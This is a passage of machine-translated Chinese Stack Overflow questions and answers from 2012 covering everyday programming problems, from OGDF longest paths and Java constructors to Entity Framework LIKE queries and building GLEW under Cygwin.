</script> 
```

我所有的插件 DLL 都在`bin`主应用程序的文件夹中。

**编辑：**当我的应用程序加载到 FF 中时，我在 Firebug 控制台中收到 403 Forbidden 错误。

# graph - 如何使用 OGDF 库在无环有向图中找到最长路径？

> ID：11786627
> 
> 赞同：1
> 
> 时间：2012-08-02T22:17:13.993
> 
> 标签：graph, shortest-path, longest-path

我是 OGDF 库的新手，需要在无环有向图中找到最长的路径（我想使用 OGDF 内置函数）。我知道，可以使用边缘权重为负的最短路径算法找到最长路径，但也找不到合适的函数。OGDF 是否具有执行此操作的特定功能？如果是，我该如何使用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:44:24.130

在 OGDF 中，您可以`s`使用`ShortestPathWithBFM`. 边的长度（权重）应该传递给函数，使用`EdgeArray<int>`. 这是其源代码中的类定义：

```
namespace ogdf {

class OGDF_EXPORT ShortestPathWithBFM : public ShortestPathModule
{
public:
 ShortestPathWithBFM() { }

 // computes shortest paths
 // Precond.:
 //
 // returns false iff the graph contains a negative cycle
 bool call(
 const Graph          &G,      // directed graph
 const node           s,       // source node
 const EdgeArray<int> &length, // length of an edge
 NodeArray<int>       &d,      // contains shortest path distances after call
 NodeArray<edge>      &pi
 );

};

} // end namespace ogdf 
```

如果您以负数传递长度，该算法将计算最长路径。更多信息请参考：[http ://www.ogdf.net/doc-ogdf/classogdf_1_1_shortest_path_with_b_f_m.html](http://www.ogdf.net/doc-ogdf/classogdf_1_1_shortest_path_with_b_f_m.html)

# iphone - 解析 iphone 超过 20 MB 的大型 xml 文件

> ID：11786628
> 
> 赞同：0
> 
> 时间：2012-08-02T22:17:18.207
> 
> 标签：iphone, xml, parsing

我想在 iPhone 中解析大型 xml 文件，我尝试过 touch xml、gData 和其他 xml 解析器，包括 SAX 解析器。我的应用程序在解析 xml 文件或解析 xmls 后崩溃，因为它在内存中保留了 40 MB 的数据解析大型 xml 文件的最佳方法？我想解析数据并将其插入核心数据。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:27:52.680

从[这篇文章](http://www.raywenderlich.com/553/how-to-chose-the-best-xml-parser-for-your-iphone-project)（在“选择哪个”部分）：

> 如果您想阅读非常大的 XML 文档，性能是这里的关键问题。您需要为此考虑 libxml2 SAX、TBXML 或 libxml DOM，具体取决于您的具体情况。

如果您正确解析，则不应在内存中保存 40MB 的解析数据。请务必在解析时将数据批量插入 Core Data，以避免导致内存警告和应用程序崩溃。

# php - 这是将随机值转换为小数的最佳方法吗？

> ID：11786630
> 
> 赞同：0
> 
> 时间：2012-08-02T22:17:32.790
> 
> 标签：php, math

我有一个数字需要乘以随机数（1-4%）

用 PHP 术语来说，我在想..

```
$percent = (double) ".0".mt_rand(1,4); 
```

那会产生 0.01 - .04 吗？以数字形式，而不是字符串？

如果这么好，但是有没有更安全/更有效的方法呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T22:19:03.917

为什么不只是`$percent = mt_rand(1, 4)/100.0;`

# java - Java：当超级构造函数需要参数时如何初始化孩子

> ID：11786632
> 
> 赞同：6
> 
> 时间：2012-08-02T22:17:36.487
> 
> 标签：java, constructor, initialization, subclass, inheritance

我有

```
class A {

    int var;
    public A(int x) {
        var = x;
    }
}

class B extends A {
     int var2;

     public B(int x, int y) {
         super(...);
         var2 = y;
         x = f(y);
     }
 } 
```

对于子类 B，我需要计算在 A 的构造函数中使用的值 x。如果我可以自由移动`super`到 my 之下，`x=f(y)`那么我可以将结果传递给 A（超级）的构造函数。但是 super 必须是 B 的构造函数的第一行。

有什么方法可以第一次用正确的值初始化 A 吗？如果 A.var 是最终的并且我无法在构建后返回并更改它怎么办？

当然，我可以提出`super(f(y))`，但我可以想象这会变得困难的情况。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-02T22:22:52.853

假设`var`是私有的并且您**需要**使用构造函数设置值（这似乎是问题的重点，否则有很多简单的解决方案），我只会使用类似工厂的静态方法来完成。

```
class B extends A {
     int var2;

     public static B createB(int x, int y) {
         x = f(y);
         return new B(x, y);
     }

     public B(x, y) {
         super(x);
         this.var2 = y;
     }
 } 
```

类似的东西。您别无选择，因为显式构造函数调用必须发生在包装构造函数的第一行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:30:43.267

你可以这样做：

```
class B extends A {
    int var2;

    public B(int x, int y) {
        super(calculateX(y));
        var2 = y;
    }

    private static int calculateX(int y) {
        return y;
    }
} 
```

调用静态方法是调用超类构造函数之前唯一可以做的事情。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:25:38.480

替代 hvgotcodes，因为看起来您还想设置 A 的变量...

```
class B extends A {
 int var2;

 public B(int x, int y) {
     super(x);
     var2 = y;
     x = f(y);
     super.var = ...;
 }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T22:54:44.477

另一种方法可能是向 A 添加一个不带参数的受保护构造函数，该构造函数依赖于延迟初始化：

```
class A {
    int var;

    public A(int x) {
        var = x;
    }

    /**
    * Just use this constructor if you initialize var
    */
    protected A(int x) {
    }
}

class B extends A {
    int var2;

    public B(int x, int y) {
        super();
        var2 = y;
        var = f(y);
    }
} 
```

但这很难记录，对团队成员来说不是很明显，不应该用于 api。

# c - C中两个整数的快速双向哈希

> ID：11786635
> 
> 赞同：7
> 
> 时间：2012-08-02T22:17:53.343
> 
> 标签：c, linux, module, kernel

我正在编写一个 Linux 内核模块，我需要提出一个哈希函数，它需要两个整数作为输入。因为代码在内核空间中运行，所以没有一个标准库可供我使用。

基本上，我需要一个散列函数，其中：

```
hash(a, b) = c
hash(b, a) = c 
```

其中 a 和 b 可接受的输入是无符号 32 位整数。散列函数应该返回一个无符号的 64 位整数。冲突（即 hash(a, b) = c 和 hash(d, f) = c）是不可取的，因为这些值将用于二叉搜索树。搜索的结果是可能结果的链接列表，然后在实际比较 a 和 b 的位置进行迭代。所以一些碰撞是可以接受的，但碰撞越少，需要的迭代越少，运行速度就越快。

性能也非常重要，当我编写防火墙应用程序时，此查找将用于系统中收到的每个数据包（整数实际上是数据包源和目标地址）。该函数用于查找现有的网络会话。

感谢您的时间。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:34:02.077

如何做到这一点的伪代码：

```
if a>b
  return (a << 32) | b;
else 
  return (b << 32) | a; 
```

这满足 hash(a,b) == hash(b,a)，利用完整的 64 位空间，并且不应该有冲突......我认为 :)

注意不要直接移位 32 位变量。改用中间 64 位缓冲区或内联强制转换：

```
uint64_t myhash(uint32_t a, uint32_t b)
{
    uint64 a64 = (uint64_t) a;
    uint64 b64 = (uint64_t) b;
    return (a > b) ? ((a64 << 32) | b64) : ((b64 << 32) | a64);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T22:30:54.653

```
((a | b) << 32) + (a & b) 
```

是可交换的并且应该导致最小数量的冲突。不过，我必须多考虑一下……

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-02T22:37:07.743

```
#define MYHASH(a,b) ( (((UINT64) max(a,b)) << 32) | ((UINT64) min(a,b)) ) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T22:40:02.447

怎么样`((uint64_t)max(a, b) << UINT64_C(32)) | (uint64_t)min(a, b))`？这将完全避免冲突，因为输入之间没有可能的重叠。不过，我不能谈论分布，因为这取决于您的输入值。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-02T22:40:57.260

（一^二）| ((a ^ ~b) <<32);

# java - 为什么此代码会生成“潜在资源泄漏”警告？

> ID：11786637
> 
> 赞同：8
> 
> 时间：2012-08-02T22:17:57.830
> 
> 标签：java, eclipse, warnings, static-analysis, resource-leak

Eclipse (Juno) 给出以下警告：

> 潜在的资源泄漏：“os”可能未关闭

`try`在这段代码正文的第一行：

```
static void saveDetails(byte[] detailsData) {
    OutputStream os = null;
    try {
        os = sContext.openFileOutput(DETAILS_FILE_NAME, Context.MODE_PRIVATE);
        os.write(detailsData);
    } catch (IOException e) {
        Log.w(LOG_TAG, "Unable to save details", e);
    } finally {
        if (os != null) {
            try {
                os.close();
            } catch (IOException ignored) {
            }
        }
    }
} 
```

该方法`openFileOutput`被声明为抛出一个`FileNotFoundException`.

这是误报吗？这似乎是一个相当普通的执行路径分析。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-02T22:22:40.527

在我看来，这是一个误报。您的资源在“finally”块中关闭，所以我看不出这里可能出了什么问题。

作为旁注，如果您使用的是 Java 7，我建议使用“try-with-resources”习语。

```
static void saveDetails(byte[] detailsData) {    
    try (OutputStream os = sContext.openFileOutput(DETAILS_FILE_NAME, Context.MODE_PRIVATE);) {
        os = sContext.openFileOutput(DETAILS_FILE_NAME, Context.MODE_PRIVATE);
        os.write(detailsData);
    } catch (IOException e) {
        Log.w(LOG_TAG, "Unable to save details", e);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:50:40.357

如果您将 open 和 close 都移至 first try 子句怎么办？他们抛出相同类型的异常。并删除 if os != null。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-08-02T22:35:55.590

我的猜测是因为你`if (os != null)`在关闭之前有。由于它是有条件的，因此 OutputStream 可能未关闭。

如果您尝试：

```
static void saveDetails(byte[] detailsData) {
    OutputStream os = null;
    try {
        os = sContext.openFileOutput(DETAILS_FILE_NAME, Context.MODE_PRIVATE);
        os.write(detailsData);
    } catch (IOException e) {
        Log.w(LOG_TAG, "Unable to save details", e);
    } finally {
        try {
            os.close();
        } catch (IOException ignored) {
        }
    }
} 
```

# asp.net-mvc - 如何将包含另一个仅状态对象的仅状态对象发送到 Web API 控制器？

> ID：11786638
> 
> 赞同：0
> 
> 时间：2012-08-02T22:18:03.127
> 
> 标签：asp.net-mvc, c#-4.0, serialization, asp.net-web-api, jquery-datatables

我正在尝试将一个简单的对象（AjaxSubmission）从表单发送到用于编辑表的 Web API 控制器。

AjaxSubmission 始终具有相同的字段。一个字段，“数据”是指另一个简单的对象，它具有特定表的访问器（下面的员工或供应商示例）。

```
public class AjaxSubmission
{
    public string action { get; set; }
    public string table { get; set; }
    public string id { get; set; }
    // ...

    //// The following may be any other custom class
    public Employees data { get; set; } // Could be Vendors or whatever
}

// Stored in AjaxSubmission (or so I hope) 
public class Employees
{
    public string name { get; set; }
    public float salary { get; set; }
    public long id { get; set; }
}

// Stored in AjaxSubmission 
public class Vendors
{
    public string dba { get; set; }
    public int accountNum { get; set; }
    public int zipcode { get; set; }
} 
```

我的控制器像这样获取数据：

```
public EditorServerResponse Put(AjaxSubmission ajaxSubmission = null) {
    // Handle the data
} 
```

*   当我将“数据”设为对象或动态时，它显示为空对象。我不能将它“作为”给员工或供应商，因为它不存储任何东西。
*   我怀疑这是序列化程序的限制。MVC4 将 JSON.NET 用于 JSON，但数据以“Content-Type: application/x-www-form-urlencoded; charset=UTF-8”的形式发送。
*   我不能轻易更改数据的发送方式，因为这就是 Datatables 编辑器插件的工作方式。我认为这是发送数据的合理方式，也是.NET 能够处理的合理问题。
*   如果我为 AjaxSubmission 可能包含的每种数据类型创建一个不同的类，我可以获得我需要的数据，但除了一行代码之外，每个数据类型都是重复的。这严重违反了 DRY 原则。

我的问题是：如何在不重复自己的情况下发送 AjaxSubmission？.NET 有能力做这样的事情吗？

编辑：提琴手说数据看起来像：

```
action  edit
table   
id  row_4
data[amu]   49
data[chemicalFormula]   BF2
data[commonName]    Boron difluoride
data[status]    Y
data[notes] 
```

原始数据为：action=edit&table=&id=row_4&data%5Bamu%5D=49&data%5BchemicalFormula%5D=BF2&data%5BcommonName%5D=Boron+difluoride&data%5Bstatus%5D=Y&data%5Bnotes%5D=

（这与我的简化示例不同但相似）

# c# - 如何在 XNA 中最大化窗口

> ID：11786640
> 
> 赞同：2
> 
> 时间：2012-08-02T22:18:14.803
> 
> 标签：c#, xna, window, maximize

这应该是一个非常简单的问题，但经过大量搜索后，似乎在任何地方都没有工作示例。我只想让我的 XNA 窗口开始最大化。我知道如何设置窗口的宽度和高度，但这并不完全相同。我还需要在不全屏的情况下执行此操作。我只想要一个正常的最大化窗口。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T22:20:18.407

将`IsFullScreen`图形设备管理器的属性设置为 true。

[http://msdn.microsoft.com/en-us/library/bb195024(v=xnagamestudio.10).aspx](http://msdn.microsoft.com/en-us/library/bb195024(v=xnagamestudio.10).aspx)

```
 //from the above msdn sample
    graphics = new GraphicsDeviceManager( this );
    content = new ContentManager( Services );

    graphics.PreferredBackBufferWidth = 800;
    graphics.PreferredBackBufferHeight = 600;
    graphics.PreferMultiSampling = false;
    graphics.IsFullScreen = true; 
```

[http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.graphicsdevicemanager.isfullscreen(v=xnagamestudio.10).aspx](http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.graphicsdevicemanager.isfullscreen(v=xnagamestudio.10).aspx)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-03T15:17:03.190

@Cyral 有迄今为止最接近的答案，但它仍然不是你想要的。要最大化 Windows 窗体，请使用 WindowState 属性：

```
var form = (Form)Form.FromHandle(Window.Handle);
form.WindowState = FormWindowState.Maximized; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-03T13:00:13.553

您可以添加对 System.Windows.Forms 和 System.Drawing 的引用（但是，由于模棱两可，您需要输入命名空间）

在 base.Initialize 之后使用以下代码

```
Form form = (Form)Form.FromHandle(Window.Handle);
form.Location = Point(0, 0);
form.Size = Screen.PrimaryScreen.WorkingArea.Size; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-09-23T18:29:49.487

其他人已经涵盖了自动最大化的步骤，但是要启用实际的最大化按钮以便用户可以在需要时进行操作，请在 Game 构造函数中执行此操作：

```
Window.AllowUserResizing = true; 
```

根据您希望游戏在调整大小开始和结束时的行为方式，或者暂停游戏，您可能需要处理其中一些事件。

```
 Form form = (Form)Form.FromHandle(Window.Handle);
    form.ResizeBegin += new EventHandler(form_ResizeBegin);
    form.ResizeEnd += new EventHandler(form_ResizeEnd);
    form.LocationChanged += new EventHandler(form_LocationChanged); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-03T08:38:37.153

```
_graphics = new GraphicsDeviceManager(this);
DisplayMode displayMode = GraphicsAdapter.DefaultAdapter.CurrentDisplayMode;
this._graphics.PreferredBackBufferFormat = displayMode.Format;
this._graphics.PreferredBackBufferWidth = (int)(displayMode.Width);
this._graphics.PreferredBackBufferHeight = (int)(displayMode.Height); 
```

**对我来说有点**作品但不完全，一旦你尝试你就会明白。我的意思是，它并不完美，我确信有更好的方法，但对于原型制作这应该可以工作 - 或者通过一些调整你可以获得你需要的东西。

# ios - ALAssetLibraryChangedNotification 触发多次

> ID：11786647
> 
> 赞同：3
> 
> 时间：2012-08-02T22:18:44.603
> 
> 标签：ios, iphone, uiimage, alassetslibrary

我正在编写一个应用程序，用户可以在其中选择多个图像并要求将它们保存到库中。我使用 ALAssetLibrary 创建图库中所有图像的列表供用户选择。当用户要求保存时，我一次保存一张图片以使用`[library writeImageToSavedPhotosAlbum:metadata:completionBlock:]`. 所以我首先保存一个图像，然后在完成块中，保存另一个图像，依此类推。

我希望 ALAssetsLibraryChangedNotification 被调用的次数与要保存的图像数量一样多。但它被调用了两倍的次数。任何线索为什么会发生这种情况？我已经检查过我实际上只为每个选定的图像编写了一次图像。在我保存每张图像后立即出现通知。一旦我收到每个保存的图像的所有通知，我就会重新加载库并再次加载资产。每次我完成重新加载资产时，通知都会再次出现。

有没有办法让我知道是否有更多这样的通知出现，以便我可以选择仅在最后一个通知之后执行实际处理？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T20:50:22.927

额外的通知可能是由于照片流更新，如果你有它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-18T21:42:27.663

我发现解决这个问题的最佳解决方案是在执行保存操作之前删除观察者。

```
[[NSNotificationCenter defaultCenter] removeObserver:self name:ALAssetsLibraryChangedNotification object:nil]; 
```

然后在保存所有内容后再次订阅通知。

# php - 在一个网站上使用多个 php 框架

> ID：11786649
> 
> 赞同：4
> 
> 时间：2012-08-02T22:18:46.480
> 
> 标签：php, apache, codeigniter, unix, symfony1

我们的主网站使用 symfony 1，当我开始编写代码时，似乎无法升级（以前开发人员的自定义代码太多）。现在，我们正在为公司提供的产品添加大量内容。我不想使用一个非常旧的框架，而是想使用 CodeIgniter，因为我对它非常熟悉。我真正的问题：

设置网站以使用多个框架的正确方法是什么。新功能将与原始网站分开，但仍需要数据库的一些表。

我打算让 apache 处理根目录取决于 url 的位置，并且正常执行所有操作。主网站是 example.com，新功能将是 abc.example.com

我真的在寻找已经这样做的人以及他们的一些提示和警告。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:32:09.573

PHP 将根据服务器上加载的目录运行框架。例如，在大多数 apache 服务器上，根目录`example.com`为`/www`. 这意味着 Symphony 的所有代码都在`/www/*`.

当您设置子域的路径时，只需将其放在`/www`文件夹之外。然后，当您访问 abc.example.com 时，apache 不会尝试将原始站点与 Symphony 框架一起加载。

我认为这两个框架共享相同的数据库表会很好。我不完全确定您计划如何让这两个应用程序工作，但只要您不更改列名和类型就可以了。

如果您不希望应用程序共享原始表中的数据，请考虑使用`[mysqldump](http://dev.mysql.com/doc/refman/5.1/en/mysqldump.html)`或类似的方法将数据复制到新表中。

# spring - 关于 web.xml 的 Spring Security 注释配置

> ID：11786656
> 
> 赞同：0
> 
> 时间：2012-08-02T22:19:10.670
> 
> 标签：spring, spring-security, web.xml, spring-annotations

我正在使用基于注释的配置，到目前为止没有 web.xml。

现在，[根据文档](http://static.springsource.org/spring-security/site/docs/3.0.x/reference/ns-config.html#ns-web-xml)，我需要创建一个 web.xml 文件并将这些字段添加到其中：

```
<filter>
  <filter-name>springSecurityFilterChain</filter-name>
  <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
</filter>

<filter-mapping>
  <filter-name>springSecurityFilterChain</filter-name>
  <url-pattern>/*</url-pattern>
</filter-mapping> 
```

我也可以用注释来配置它吗？

因为如果我制作一个 web.xml 并*只*放这个，我会在运行时遇到一些其他错误（比如缺少 ContextLoaderListener 等）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T02:02:39.013

web.xml 是标准 Web 应用程序打包结构的一部分。这种结构允许您将打包好的 war 文件部署在不同的服务器上，例如 Tomcat 和 Jetty。

您可以在此处阅读有关 web.xml 的更多信息：[http ://en.wikipedia.org/wiki/Deployment_descriptor](http://en.wikipedia.org/wiki/Deployment_descriptor)

您可以在此处阅读有关标准目录结构的信息（这是针对 Tomcat 的，但大多数 Web 服务器遵循相同/相似的结构）：http: [//tomcat.apache.org/tomcat-6.0-doc/appdev/deployment.html#标准_目录_布局](http://tomcat.apache.org/tomcat-6.0-doc/appdev/deployment.html#Standard_Directory_Layout)

如果您的应用程序是 Web 应用程序，您应该已经有一个 web.xml。如果没有，那么您不应该**创建**web.xml，而是在 Spring Security 中找到另一种挂钩方式。请让我们知道您的应用程序当前是如何部署的。

这是带有 Spring Security 的 Spring 的 web.xml 示例：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE web-app
    PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
    "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>

    <!-- Spring Security Filter -->
<filter>
    <filter-name>springSecurityFilterChain</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
</filter>

    <filter-mapping>
    <filter-name>springSecurityFilterChain</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>

    <listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
</listener>
<listener>
    <listener-class>org.springframework.web.context.request.RequestContextListener</listener-class>
</listener>

    <!-- The front controller of the Spring MVC Web application, responsible 
    for handling all application requests -->
<servlet>
    <servlet-name>Spring MVC Dispatcher Servlet</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>
            /WEB-INF/web-application-config.xml
        </param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>

<!-- Map requests to the DispatcherServlet for handling -->
<servlet-mapping>
    <servlet-name>Spring MVC Dispatcher Servlet</servlet-name>
    <url-pattern>/app/*</url-pattern>
</servlet-mapping>

    <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
</welcome-file-list>

</web-app> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T02:25:18.043

对于 Web 应用程序，您需要一个 web.xml。

关于您缺少 ContextLoaderListener 的错误，只需将其添加到 web.xml

```
<listener>
<listener-class>
    org.springframework.web.context.ContextLoaderListener
</listener-class>
</listener> 
```

# jquery - 从预生成的 html 块中隐藏或删除跨度

> ID：11786660
> 
> 赞同：1
> 
> 时间：2012-08-02T22:19:27.223
> 
> 标签：jquery, html

是否可以从它们中删除所有跨度或事件元素样式？

它们是由 VBulletin 创建的，所以我不能手动完成

```
<div class="thanklist">
        <a href="member.php?u=1394" rel="nofollow"><span style="color: #F3484E; font-weight:bold;">mynameisdonald</span></a>
        <a href="member.php?u=1394" rel="nofollow"><span style="color: #F3484E; font-weight:bold;">mynameisdonald</span></a>
</div> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:22:31.307

是的，您可以使用`removeAttr()`方法，尝试以下方法：

```
$('.thanklist span').removeAttr('style'); 
```

[演示](http://jsfiddle.net/SyZAL/)

或者，如果您想删除它们的跨度，您可以使用`remove()`以下方法：

```
$('.thanklist span').remove(); 
```

[演示](http://jsfiddle.net/SyZAL/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:23:28.177

```
​$('.thanklist span').each(function(i, el){
    $(this).parent().html($(this).html());
});​​​​​​​​​​​​​​​​​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:22:05.020

你能添加一个css类吗：

```
span {
   display: none;
} 
```

# php - 一旦获得批准，如何存储 LinkedIn API oauth 密钥？

> ID：11786661
> 
> 赞同：0
> 
> 时间：2012-08-02T22:19:38.003
> 
> 标签：php, api, oauth, linkedin

我需要有人在 LinkedIn API 方面的帮助。

一旦我接受连接，我目前正在从会话中设置 requestToken、oath_verifier 和 oauth_access_token。这一切都很好，但很明显，当会话结束时，我必须再次批准该应用程序才能查看我的数据。

```
32\. $linkedin->request_token    =   unserialize($_SESSION['requestToken']);
33\. $linkedin->oauth_verifier   =   $_SESSION['oauth_verifier'];
34\. $linkedin->access_token     =   unserialize($_SESSION['oauth_access_token']); 
```

一旦我接受了一次连接，我将如何手动设置这些，这样我每次使用时都不必批准我的应用程序？目前我将以下值保存在我的数据库中，但是当我使用下面的代码时，我的 PHP 出现语法错误？

我怎样才能重写下面的代码使其工作？

```
32\. $linkedin->request_token    =   OAuthConsumer['key=1234-1234,secret=4321-4321'];
33\. $linkedin->oauth_verifier   =   '1234';
34\. $linkedin->access_token     =   OAuthConsumer['key=5678-5678,secret=8765-8765']; 
```

这是错误代码：

```
Parse error: syntax error, unexpected '[' in /home/pjharrison/test/index.php on line 32 
```

谢谢皮特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:51:30.887

要跨会话存储 OAuth 令牌，您需要使用更永久的存储介质，例如您最喜欢的数据库风格，如[MySQL](http://www.mysql.com/)。

然后，您需要通过用户帐户将令牌映射到返回用户。当用户 A 登录到您的站点时，您将拥有他们存储的 OAuth 令牌，并且可以使用令牌通过 LinkedIn [REST API](https://developer.linkedin.com/rest)进行调用。

# c# - 使用实体框架进行 LIKE 查询

> ID：11786664
> 
> 赞同：44
> 
> 时间：2012-08-02T22:19:43.697
> 
> 标签：c#, wpf, sql-server-2008-r2, ef-code-first

> **可能重复：**
> [如何在 Linq 中执行 SQL Like %？](https://stackoverflow.com/questions/835790/how-to-do-sql-like-in-linq)
> [像实体框架中的运算符？](https://stackoverflow.com/questions/1033007/like-operator-in-entity-framework)

我正在做这样的查询：

```
 var matches = from m in db.Customers
        where m.Name == key
        select m; 
```

但我不需要`m.Name`完全等于 key。我需要`m.Name`像钥匙一样。

我找不到如何重新创建 SQL 查询：

```
 WHERE m.Name LIKE key 
```

我正在使用 SQL Server 2008 R2。

怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2012-08-02T22:24:50.110

像这样的 linq 查询对你有用吗？

```
var matches = from m in db.Customers
    where m.Name.Contains(key)      
    select m; 
```

这也应该工作我编辑了我的答案。

`Contains`映射到不区分大小写的 LIKE '%@p0%'

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2012-08-02T22:23:01.500

```
var matches = from m in db.Customers     
    where m.Name.StartsWith(key)
    select m; 
```

进行搜索并比较字符串是小写还是大写以获得最佳结果，因为 C# 区分大小写。

```
var matches = from m in db.Customers     
    where m.Name.ToLower().StartsWith(key.ToLower())
    select m; 
```

# c++ - 将 GLEW 与 Cygwin 捆绑失败

> ID：11786665
> 
> 赞同：1
> 
> 时间：2012-08-02T22:19:49.800
> 
> 标签：c++, mingw, codeblocks, glew

我需要从源代码构建 GLEW，以便我可以在 Code::Blocks 中将它与 Mingw 一起使用，因为 Mingw 不喜欢使用他们在 VS 中编译的那个。[我正在使用 Cygwin，我在这里](http://glew.sourceforge.net/)下载 GLEW 的源代码并解压缩。然后我使用 cd 浏览到带有 Cygwin 的文件夹。然后我跑

> 制作 Makefile

然后它给了我这些错误。

```
config/config.guess: line 6: $'\r': command not found
config/config.guess: line 8: $'\r': command not found
config/config.guess: line 26: $'\r': command not found
config/config.guess: line 27: $'\r': command not found
config/config.guess: line 38: $'\r': command not found
config/config.guess: line 40: $'\r': command not found
config/config.guess: line 52: $'\r': command not found
config/config.guess: line 63: $'\r': command not found
config/config.guess: line 66: $'\r': command not found
config/config.guess: line 69: syntax error near unexpected token `$'in\r''
'onfig/config.guess: line 69: `  case $1 in
config/config.guess: line 6: $'\r': command not found
config/config.guess: line 8: $'\r': command not found
config/config.guess: line 26: $'\r': command not found
config/config.guess: line 27: $'\r': command not found
config/config.guess: line 38: $'\r': command not found
config/config.guess: line 40: $'\r': command not found
config/config.guess: line 52: $'\r': command not found
config/config.guess: line 63: $'\r': command not found
config/config.guess: line 66: $'\r': command not found
config/config.guess: line 69: syntax error near unexpected token `$'in\r''
'onfig/config.guess: line 69: `  case $1 in
Makefile:40: *** "Platform '' not supported".  Stop. 
```

我已经阅读过，但我还没有找到解决这个问题的有用信息。如果您知道更好的方法，我可以让 GLEW 与 Mingw 合作，这也可以回答我的问题。

在 Windows XP 上使用 Code::Blocks 10.05 使用 Cygwin 1.7.16-1 使用 GLEW 1.8.0

**更新**

这些错误已在 config.guess 文件中使用 dos2unix 修复。但是，当我现在运行 Makefile 时，它​​说没有什么可做的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:24:57.770

看起来很像 config.guess 有 DOS 行尾（“\r\n”），但 make 期待 Unix 行尾（“\n”）。我会在 config.guess 上运行任何工具将其转换为 Unix 行结尾，我的 cygwin 有一个名为 dos2unix 的工具可以解决问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:29:37.053

如果您只想在 Windows 下编写代码和构建，请参阅此主题[Using GLEW to use OpenGL extensions under Windows](https://stackoverflow.com/questions/17370/using-glew-to-use-opengl-extensions-under-windows)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T04:26:03.997

抱歉，回复晚了，但在 cygwin 中设置变量 SYSTEM 有效：

`$ SYSTEM=cygwin make`

# ruby-on-rails-3 - Rails 创建 has_record？对于嵌套模型

> ID：11786667
> 
> 赞同：0
> 
> 时间：2012-08-02T22:20:02.297
> 
> 标签：ruby-on-rails-3, rails-models

我有两个模型

```
 class Article < ActiveRecord::Base
    has_one :review
  end

  class Review < ActiveRecord::Base
    belongs_to :article
  end 
```

现在我想在文章中有这个方法

```
 class Article < ActiveRecord::Base
    has_one :review

    def self.has_review?

    end

  end 
```

我尝试过使用 .count、.size ......但我有错误......我该怎么做才能让以下代码正常工作

```
@article = Article.find(xxx)
if @article.has_revew?
 ....
else
 ...
end 
```

我需要它的原因是因为如果有评论或没有评论，我将在视图或控制器中执行不同的操作

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:36:55.287

```
class Article < ActiveRecord::Base
  has_one :review

  def has_review?
    !!review
  end
end 
```

这只是在实例上定义了一个方法（`def self.method`定义了一个类方法）。该方法尝试加载`review`. 如果`review`不存在，它将为零。`!!`只需将其反转两次，如果评论存在则返回 true，如果评论存在则返回 false `nil`。

# c# - 如何在类中引用本机函数？

> ID：11786676
> 
> 赞同：0
> 
> 时间：2012-08-02T22:21:06.770
> 
> 标签：c#, c++, native, dllimport

我有一个 dll，它导出函数，如下所示`MyClass::MyMethod(char*)`：

如何通过 DllImport 使用它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T22:28:20.323

您使用 DllImport，如下所示：

```
[DllImport("MyNativeC++DLL.dll")]
private static extern void MyMethod(StringBuilder myCharPointerParameter); 
```

请参阅[将 char 指针从 C# 传递给 c++ 函数](https://stackoverflow.com/questions/4385783/passing-char-pointer-from-c-sharp-to-c-function)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:33:21.220

如果`MyClass::MyMethod`是静态的，则可以轻松导出和 p/Invoked（请参阅 Eric 的回答）。

